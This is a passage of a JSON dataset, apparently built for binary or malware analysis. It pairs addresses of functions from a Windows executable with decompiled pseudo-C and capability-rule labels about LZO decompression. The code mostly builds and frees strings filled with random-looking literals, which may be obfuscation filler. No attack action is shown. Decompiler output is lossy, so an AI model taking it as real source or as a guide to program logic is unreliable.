            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004022c5(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t arg_8h;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint32_t in_stack_ffffff4c;\n    uint auStack148 [2];\n    char *pcStack140;\n    int32_t iStack136;\n    uint uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uint uStack80;\n    ushort uStack76;\n    uchar uStack74;\n    uint uStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack148;\n    uStack24 = 0x44c380;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack68 = 0xf;\n    uStack72 = 0xe;\n    iStack88 = 0x74676773;\n    uStack84 = 0x6b6d6a6b;\n    uStack80 = 0x7a707a6a;\n    uStack76 = 0x6b62;\n    uStack74 = 0;\n    uStack120 = 0;\n    uStack116 = 0xf;\n    iStack136 = 0;\n    uStack20 = 7;\n    pcStack140 = \"nkumjsilrbhzmkqaweuysddxfjcehkaopdswauctyobdslocouctwdxxdx\";\n    auStack148[0] = 0x3a;\n    fcn.00402f72();\n    uStack48 = 0;\n    uStack44 = 0xf;\n    uStack64 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x3a, iStack112, \"nkumjsilrbhzmkqaweuysddxfjcehkaopdswauctyobdslocouctwdxxdx\");\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x3a, uStack36, \"nkumjsilrbhzmkqaweuysddxfjcehkaopdswauctyobdslocouctwdxxdx\");\n    if (uStack92 < 0x10) {\ncode_r0x00429959:\n        if (0xf < uStack44) {\n            in_stack_ffffff4c = uStack44 + 1;\n            arg_8h = uStack64;\n            if (0xfff < in_stack_ffffff4c) {\n                arg_8h = *(uStack64 - 4);\n                if (0x1f < (uStack64 - 4) - arg_8h) goto code_r0x00429b45;\n                in_stack_ffffff4c = uStack44 + 0x24;\n            }\n            fcn.00401a32(arg_8h);\n        }\n        *puStack40 = 0;\n        puStack40[4] = 0;\n        puStack40[5] = 0xf;\n        *puStack40 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x10, in_stack_ffffff4c & 0xffffff00 | uStack64 & 0xff, \"innekplbaboriqnj\");\n        if (0xf < uStack116) {\n            iVar2 = iStack136;\n            if ((0xfff < uStack116 + 1) && (iVar2 = *(iStack136 + -4),  0x1f < (iStack136 + -4) - iVar2))\n            goto code_r0x00429b51;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x00429b5d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00429b69;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x00429b75;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar2 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar2 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar2)) goto code_r0x00429b81;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff4c = uStack92 + 1;\n    iVar2 = iStack112;\n    if (in_stack_ffffff4c < 0x1000) {\ncode_r0x0042994d:\n        fcn.00401a32(iVar2);\n        goto code_r0x00429959;\n    }\n    iVar2 = *(iStack112 + -4);\n    if ((iStack112 + -4) - iVar2 < 0x20) {\n        in_stack_ffffff4c = uStack92 + 0x24;\n        goto code_r0x0042994d;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00429b45:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00429b51:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00429b5d:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00429b69:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00429b75:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00429b81:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1839
    },
    "004022e3": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.004022e3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44caf0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x36);\n    if (uStack40 < 0x10) {\ncode_r0x004402f9:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x004403e8;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar1 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar1 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar1)) goto code_r0x004403f4;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar1 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar1 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar1)) goto code_r0x00440400;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542854;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x004402f9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004403e8:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004403f4:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00440400:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 843
    },
    "004024f5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.004024f5(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uchar **ppuVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar4;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uchar *in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint32_t in_stack_fffffee8;\n    uint uStack224;\n    uchar uStack220;\n    char *pcStack216;\n    int32_t iStack212;\n    uint uStack196;\n    uint32_t uStack192;\n    int32_t iStack188;\n    uint uStack172;\n    uint32_t uStack168;\n    int32_t iStack164;\n    uint uStack148;\n    uint32_t uStack144;\n    uint32_t uStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    int32_t iStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c190;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x004235c4:\n        ppuStack32 = ppuVar1;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (in_stack_00000050 < 0x10) {\ncode_r0x0042360a:\n            *in_FS_OFFSET = piStack28;\n            return *0x541fe4;\n        }\n        puStack72 = in_stack_0000003c;\n        if ((in_stack_00000050 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_0000003c + -4),  in_stack_0000003c + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x0042360a;\n        }\n    }\n    else {\n        uStack68 = param_3;\n        if ((in_stack_00000020 + 1 < 0x1000) ||\n           (uStack68 = *(param_3 - 4),  unaff_EDI = uStack68,  (param_3 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x004235c4;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack224;\n    uStack80 = 0x44c1a0;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack196 = 0;\n    uStack192 = 0xf;\n    iStack212 = 0;\n    uStack76 = 8;\n    uStack220 = iStack188;\n    pcStack216 = \"exxbdapqzzxilpnkhgiiawmh\";\n    uStack224 = 0x18;\n    fcn.00402f72();\n    uStack172 = 0;\n    uStack168 = 0xf;\n    iStack188 = 0;\n    uStack76 = 9;\n    fcn.00402f72(0x40, iStack164, \"fprysraniyukqguaajqllhhahnewgftwlchjmexqlrscxmbykkqremrzpurnbqru\");\n    uStack148 = 0;\n    uStack144 = 0xf;\n    iStack164 = 0;\n    uStack76 = 10;\n    fcn.00402f72(0x41, iStack116, \"axthugvczoopbfhducfhkbeuxyfcmeuhvxetqwmfkacquyblzhqaewbqksvppnovd\");\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 0xb;\n    fcn.00402f72(0x18, uStack140, \"exxbdapqzzxilpnkhgiiawmh\");\n    uStack124 = 0;\n    uStack120 = 0xf;\n    uStack140 = 0;\n    uStack76 = 0xd;\n    fcn.00402f72(0x18, uStack92, \"exxbdapqzzxilpnkhgiiawmh\");\n    if (uStack120 < 0x10) {\ncode_r0x0042381e:\n        if (0xf < uStack96) {\n            in_stack_fffffee8 = uStack96 + 1;\n            iVar3 = iStack116;\n            if (0xfff < in_stack_fffffee8) {\n                iVar3 = *(iStack116 + -4);\n                if (0x1f < (iStack116 + -4) - iVar3) goto code_r0x00423a5c;\n                in_stack_fffffee8 = uStack96 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack100 = 0;\n        uStack96 = 0xf;\n        iStack116 = 0;\n        uStack76 = 0xb;\n        fcn.00402f72(0x41, in_stack_fffffee8 & 0xffffff00 | uStack140 & 0xff, \n                     \"axthugvczoopbfhducfhkbeuxyfcmeuhvxetqwmfkacquyblzhqaewbqksvppnovd\");\n        uStack124 = 0;\n        uStack120 = 0xf;\n        uStack140 = 0;\n        uStack76 = 0xc;\n        fVar4 = fcn.00402f72(0x41, uStack92, \"axthugvczoopbfhducfhkbeuxyfcmeuhvxetqwmfkacquyblzhqaewbqksvppnovd\");\n        if (0xf < uStack120) {\n            uVar2 = uStack140;\n            if ((0xfff < uStack120 + 1) && (uVar2 = *(uStack140 - 4),  0x1f < (uStack140 - 4) - uVar2))\n            goto code_r0x00423a68;\n            fVar4 = fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack96) {\n            iVar3 = iStack116;\n            if ((0xfff < uStack96 + 1) && (iVar3 = *(iStack116 + -4),  0x1f < (iStack116 + -4) - iVar3))\n            goto code_r0x00423a74;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack144) {\n            iVar3 = iStack164;\n            if ((0xfff < uStack144 + 1) && (iVar3 = *(iStack164 + -4),  0x1f < (iStack164 + -4) - iVar3))\n            goto code_r0x00423a80;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack168) {\n            iVar3 = iStack188;\n            if ((0xfff < uStack168 + 1) && (iVar3 = *(iStack188 + -4),  0x1f < (iStack188 + -4) - iVar3))\n            goto code_r0x00423a8c;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack192) {\n            iVar3 = iStack212;\n            if ((0xfff < uStack192 + 1) && (iVar3 = *(iStack212 + -4),  0x1f < (iStack212 + -4) - iVar3))\n            goto code_r0x00423a98;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < ppuStack32) {\n            iVar3 = iStack52;\n            if ((0xfff < ppuStack32 + 1) && (iVar3 = *(iStack52 + -4),  0x1f < (iStack52 + -4) - iVar3))\n            goto code_r0x00423aa4;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack84;\n        return fVar4;\n    }\n    in_stack_fffffee8 = uStack120 + 1;\n    uVar2 = uStack140;\n    if (in_stack_fffffee8 < 0x1000) {\ncode_r0x00423812:\n        fcn.00401a32(uVar2);\n        goto code_r0x0042381e;\n    }\n    uVar2 = *(uStack140 - 4);\n    if ((uStack140 - 4) - uVar2 < 0x20) {\n        in_stack_fffffee8 = uStack120 + 0x24;\n        goto code_r0x00423812;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x00423a5c:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x00423a68:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x00423a74:\n    uStack76 = 3;\n    fcn.004047f5();\ncode_r0x00423a80:\n    uStack76 = 4;\n    fcn.004047f5();\ncode_r0x00423a8c:\n    uStack76 = 5;\n    fcn.004047f5();\ncode_r0x00423a98:\n    uStack76 = 6;\n    fcn.004047f5();\ncode_r0x00423aa4:\n    uStack76 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar4 = fcn.00403a76();\n    return fVar4;\n}\n",
        "token_count": 2643
    },
    "0040234c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040234c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uchar **ppuVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e270;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar3 = &ppuStack32;\n    if (param_1[0x20] < 0x10) {\ncode_r0x00417b8a:\n        ppuStack32 = ppuVar3;\n        param_1[0x1f] = 0;\n        param_1[0x20] = 0xf;\n        *(param_1 + 0x1b) = 0;\n        if (0xf < param_1[0x1a]) {\n            iVar1 = param_1[0x15];\n            iVar4 = iVar1;\n            if ((0xfff < param_1[0x1a] + 1U) && (iVar4 = *(iVar1 + -4),  0x1f < (iVar1 + -4) - iVar4))\n            goto code_r0x00417c94;\n            fcn.00401a32(iVar4);\n        }\n        param_1[0x19] = 0;\n        param_1[0x1a] = 0xf;\n        *(param_1 + 0x15) = 0;\n        if (0xf < param_1[0xd]) {\n            iVar1 = param_1[8];\n            iVar4 = iVar1;\n            if ((0xfff < param_1[0xd] + 1U) && (iVar4 = *(iVar1 + -4),  0x1f < (iVar1 + -4) - iVar4))\n            goto code_r0x00417ca0;\n            fcn.00401a32(iVar4);\n        }\n        param_1[0xc] = 0;\n        param_1[0xd] = 0xf;\n        *(param_1 + 8) = 0;\n        if (0xf < param_1[5]) {\n            iVar1 = *param_1;\n            iVar4 = iVar1;\n            if ((0xfff < param_1[5] + 1U) && (iVar4 = *(iVar1 + -4),  0x1f < (iVar1 + -4) - iVar4))\n            goto code_r0x00417cac;\n            fcn.00401a32(iVar4);\n        }\n        param_1[4] = 0;\n        param_1[5] = 0xf;\n        *param_1 = 0;\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = param_1[0x1b];\n    iVar4 = iVar1;\n    if ((param_1[0x20] + 1U < 0x1000) || (iVar4 = *(iVar1 + -4),  (iVar1 + -4) - iVar4 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iVar4);\n        ppuVar3 = ppuStack32;\n        goto code_r0x00417b8a;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00417c94:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00417ca0:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00417cac:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 950
    },
    "00402423": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00402423(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c8b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x49);\n    if (0xf < uStack40) {\n        iVar2 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar2 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043a08f;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < in_stack_0000001c) {\n        iVar2 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2)) {\ncode_r0x0043a08f:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0x151df;\n}\n",
        "token_count": 493
    },
    "00402513": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00402513(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000034;\n    uint32_t in_stack_00000048;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c0e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x4c);\n    if (uStack40 < 0x10) {\ncode_r0x00420ad6:\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x00420b78;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000048) {\n            iVar2 = in_stack_00000034;\n            if ((0xfff < in_stack_00000048 + 1) &&\n               (iVar2 = *(in_stack_00000034 + -4),  0x1f < (in_stack_00000034 + -4) - iVar2)) goto code_r0x00420b84;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00420ad6;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00420b78:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00420b84:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 691
    },
    "004025c2": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.004025c2(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44c320;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"cucncsxtwdlbwjzwehelaepfwlvs\";\n    auStack96[0] = 0x1c;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x36, uStack36, \"iomugbqzczcqtnpswlydrqheuofcfgvhdrxswexluzbuklrrfjgyli\");\n    if (uStack40 < 0x10) {\ncode_r0x004287e9:\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x0042887f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000002c) {\n            iVar1 = in_stack_00000018;\n            if ((0xfff < in_stack_0000002c + 1) &&\n               (iVar1 = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - iVar1)) goto code_r0x0042888b;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5420dc;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x004287e9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042887f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042888b:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 793
    },
    "0040568c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x0042cbea\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.0040568c(uchar *param_1, uint param_2, uint param_3, int32_t param_4, uint param_5, uint32_t param_6, \n                     uint param_7, uint param_8, uint32_t param_9, uint param_10, uint *param_11)\n\n{\n    uchar **ppuVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    int32_t iVar3;\n    uint32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000040;\n    int32_t aiStack140 [4];\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    int32_t *piStack88;\n    uint32_t *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uchar *puStack68;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c440;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    puStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (param_6 < 0x10) {\ncode_r0x0042ca13:\n        ppuStack32 = ppuVar1;\n        param_5 = 0;\n        param_6 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (in_stack_00000040 < 0x10) {\ncode_r0x0042ca58:\n            *in_FS_OFFSET = puStack28;\n            return 0;\n        }\n        puStack72 = param_11;\n        if ((in_stack_00000040 + 1 < 0x1000) || (puStack72 = param_11[-1],  param_11 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x0042ca58;\n        }\n    }\n    else {\n        puStack68 = param_1;\n        if ((param_6 + 1 < 0x1000) ||\n           (puStack68 = *(param_1 + -4),  unaff_EDI = puStack68,  param_1 + (-4 - puStack68) < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(puStack68);\n            puStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x0042ca13;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack88 = aiStack140;\n    uStack80 = 0x44c450;\n    puStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack84;\n    uStack124 = 0;\n    uStack120 = 0xf;\n    aiStack140[0] = 0;\n    uStack76 = 5;\n    fcn.00402f72(0x61, iStack116, \n                 \"lwnivduxqgvwbremwyedmewlrqctiryotultyaquvejhahmcixehwvcwdxjwvrgrohuaivlgxgwzxakyylmhywytzaxukjfyy\");\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 6;\n    fcn.00402f72(0x2f, uStack92, \"bltcffxameipntjfedejfoquzsblrsndbwctcpeoyigqhti\");\n    if (uStack96 < 0x10) {\ncode_r0x0042cb97:\n        if (0xf < uStack120) {\n            iVar3 = aiStack140[0];\n            if ((0xfff < uStack120 + 1) && (iVar3 = *(aiStack140[0] + -4),  0x1f < (aiStack140[0] + -4) - iVar3))\n            goto code_r0x0042ccbf;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < puStack28) {\n            arg_8h = &param_2;\n            if ((0xfff < puStack28 + 1U) && (arg_8h = param_1,  0x1f < &param_1 - param_1)) goto code_r0x0042cccb;\n            fcn.00401a32(arg_8h);\n        }\n        ppuStack32 = NULL;\n        puStack28 = 0xf;\n        if (0xf < unaff_EBP) {\n            uVar2 = uStack24;\n            if ((0xfff < unaff_EBP + 1) && (uVar2 = *(uStack24 - 4),  0x1f < 